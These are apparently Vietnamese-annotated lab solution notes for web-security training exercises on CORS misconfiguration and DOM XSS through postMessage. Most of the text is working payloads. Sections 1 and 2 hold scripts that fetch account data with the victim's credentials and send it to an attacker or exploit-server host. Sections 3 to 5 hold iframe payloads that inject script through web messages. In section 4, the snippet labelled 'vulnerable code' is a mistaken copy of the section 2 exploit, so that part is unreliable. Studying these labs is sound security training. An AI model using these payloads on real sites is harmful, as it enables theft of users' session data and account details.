
1.CORS vulnerability with basic origin reflection
```js
<script>
fetch('https://vuln.web-api', {credentials:'include'})
  .then(r => r.text())
  .then(data => {
    return fetch('attacker_server/?api=' + encodeURIComponent(data));
  });
</script>
```

2.CORS vulnerability with trusted null origin
Exploit server:
```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://0acf00e103f197518005122e006b004f.web-security-academy.net/accountDetails', {credentials:'include'}) .then(r => r.text()) .then(data => { return fetch('https://exploit-0ac40095035497ba80b3113d01f50035.exploit-server.net/?api=' + encodeURIComponent(data)); });
  </script>"
></iframe>;
```

3.DOM XSS using web messages
Đoạn mã có lỗ hổng
```js
<script>
	window.addEventListener('message', function(e) {
		document.getElementById('ads').innerHTML = e.data;
	})
</script>
```
Hướng tấn công là từ trang exploit của kẻ tân công tạo 1 iframe và thực hiện gửi messages chứa nội dung nguy hiểm
```js
<iframe
  src="vulnsite"
  onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"
></iframe>
```

4.DOM XSS using web messages and a JavaScript URL
Đoạn mã có lỗ hỏng
```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://0acf00e103f197518005122e006b004f.web-security-academy.net/accountDetails', {credentials:'include'}) .then(r => r.text()) .then(data => { return fetch('https://exploit-0ac40095035497ba80b3113d01f50035.exploit-server.net/?api=' + encodeURIComponent(data)); });
  </script>"
></iframe>
```
Payload
```js
<iframe
  src="vulnsite"
  onload="this.contentWindow.postMessage('javascript:print();//https:','*')"
></iframe>
```

5.DOM XSS using web messages and `JSON.parse`
Kịch bản không khác case 3 và 4. 
```js
<iframe src='vulnsite' onload="this.contentWindow.postMessage(
  JSON.stringify({
    type: 'load-channel',
    url: 'javascript:print()'
  }),
  '*'
);">
</iframe>
```